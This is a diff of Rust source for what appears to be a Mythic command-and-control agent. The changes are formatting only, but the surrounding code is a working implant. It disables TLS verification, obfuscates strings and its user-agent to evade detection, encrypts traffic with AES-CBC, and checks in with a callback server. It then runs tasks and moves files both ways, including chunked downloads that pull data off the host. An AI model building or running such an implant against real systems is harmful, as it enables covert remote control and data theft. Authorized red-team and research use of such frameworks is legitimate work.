@@ -134,7 +134,8 @@ pub fn build_client() -> ureq::Agent {
     let tls = ureq::tls::TlsConfig::builder()
         .disable_verification(true)
         .build();
-    let ua = obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string();
+    let ua =
+        obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string();
     let config = ureq::config::Config::builder()
         .timeout_global(Some(Duration::from_secs(30)))
         .user_agent(ua)
@@ -147,22 +148,24 @@ pub fn build_client() -> ureq::Agent {
 
 fn aes_cbc_encrypt(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
     use aes::Aes256;
-    use cbc::cipher::{BlockEncryptMut, KeyIvInit};
     use cbc::cipher::block_padding::Pkcs7;
+    use cbc::cipher::{BlockEncryptMut, KeyIvInit};
     type Aes256CbcEnc = cbc::Encryptor<Aes256>;
 
     let enc = Aes256CbcEnc::new(key.into(), iv.into());
     let padded_len = plaintext.len() + (16 - plaintext.len() % 16);
     let mut buf = vec![0u8; padded_len];
     buf[..plaintext.len()].copy_from_slice(plaintext);
-    let ct = enc.encrypt_padded_mut::<Pkcs7>(&mut buf, plaintext.len()).expect("encrypt");
+    let ct = enc
+        .encrypt_padded_mut::<Pkcs7>(&mut buf, plaintext.len())
+        .expect("encrypt");
     ct.to_vec()
 }
 
 fn aes_cbc_decrypt(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Option<Vec<u8>> {
     use aes::Aes256;
-    use cbc::cipher::{BlockDecryptMut, KeyIvInit};
     use cbc::cipher::block_padding::Pkcs7;
+    use cbc::cipher::{BlockDecryptMut, KeyIvInit};
     type Aes256CbcDec = cbc::Decryptor<Aes256>;
 
     let dec = Aes256CbcDec::new(key.into(), iv.into());
@@ -473,7 +476,11 @@ pub fn mythic_download(
             task_id: task_id.to_string(),
             completed: chunk_num == total_chunks,
             user_output: if chunk_num == total_chunks {
-                Some(format!("[+] Downloaded {} ({} bytes)", full_path, data.len()))
+                Some(format!(
+                    "[+] Downloaded {} ({} bytes)",
+                    full_path,
+                    data.len()
+                ))
             } else {
                 None
             },
@@ -498,6 +505,7 @@ pub fn mythic_download(
 }
 
 /// Upload a file from Mythic to the agent using chunked transfer protocol.
+#[allow(clippy::too_many_arguments)]
 pub fn mythic_upload(
     client: &ureq::Agent,
     base_url: &str,
@@ -566,12 +574,10 @@ pub fn mythic_upload(
         };
         let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
         match resp.first() {
-            Some(e) if e.status == "success" => {
-                match STANDARD.decode(&e.chunk_data) {
-                    Ok(d) => file_data.extend_from_slice(&d),
-                    Err(e) => return format!("[-] Chunk {} decode error: {}", chunk_num, e),
-                }
-            }
+            Some(e) if e.status == "success" => match STANDARD.decode(&e.chunk_data) {
+                Ok(d) => file_data.extend_from_slice(&d),
+                Err(e) => return format!("[-] Chunk {} decode error: {}", chunk_num, e),
+            },
             _ => return format!("[-] Chunk {} fetch failed", chunk_num),
         }
     }
@@ -677,7 +683,11 @@ pub fn run_c2_loop<F>(
     } else {
         format!("https://{}", decrypted_callback)
     };
-    let uri = if callback_uri.is_empty() { "/" } else { callback_uri };
+    let uri = if callback_uri.is_empty() {
+        "/"
+    } else {
+        callback_uri
+    };
 
     // ── Checkin ───────────────────────────────────────────────────────────────
     let checkin_action = obfstr::obfstr!("checkin").to_string();
@@ -774,15 +784,24 @@ pub fn run_c2_loop<F>(
             if task.command == obfstr::obfstr!("download") {
                 let path = extract_param(&task.parameters, "path");
                 let output = mythic_download(
-                    &client, &base, uri, &callback_id, &encryption_key,
-                    &task.id, &path,
+                    &client,
+                    &base,
+                    uri,
+                    &callback_id,
+                    &encryption_key,
+                    &task.id,
+                    &path,
                 );
                 let is_error = output.starts_with("[-]");
                 responses.push(TaskResponse {
                     task_id: task.id.clone(),
                     completed: true,
                     user_output: Some(output),
-                    status: if is_error { Some("error".to_string()) } else { None },
+                    status: if is_error {
+                        Some("error".to_string())
+                    } else {
+                        None
+                    },
                     download: None,
                     upload: None,
                 });
@@ -792,15 +811,25 @@ pub fn run_c2_loop<F>(
                 let file_id = extract_param(&task.parameters, "file");
                 let dest = extract_param(&task.parameters, "remote_path");
                 let output = mythic_upload(
-                    &client, &base, uri, &callback_id, &encryption_key,
-                    &task.id, &file_id, &dest,
+                    &client,
+                    &base,
+                    uri,
+                    &callback_id,
+                    &encryption_key,
+                    &task.id,
+                    &file_id,
+                    &dest,
                 );
                 let is_error = output.starts_with("[-]");
                 responses.push(TaskResponse {
                     task_id: task.id.clone(),
                     completed: true,
                     user_output: Some(output),
-                    status: if is_error { Some("error".to_string()) } else { None },
+                    status: if is_error {
+                        Some("error".to_string())
+                    } else {
+                        None
+                    },
                     download: None,
                     upload: None,
                 });
@@ -813,7 +842,11 @@ pub fn run_c2_loop<F>(
                 task_id: task.id.clone(),
                 completed: true,
                 user_output: Some(output),
-                status: if is_error { Some("error".to_string()) } else { None },
+                status: if is_error {
+                    Some("error".to_string())
+                } else {
+                    None
+                },
                 download: None,
                 upload: None,
             });
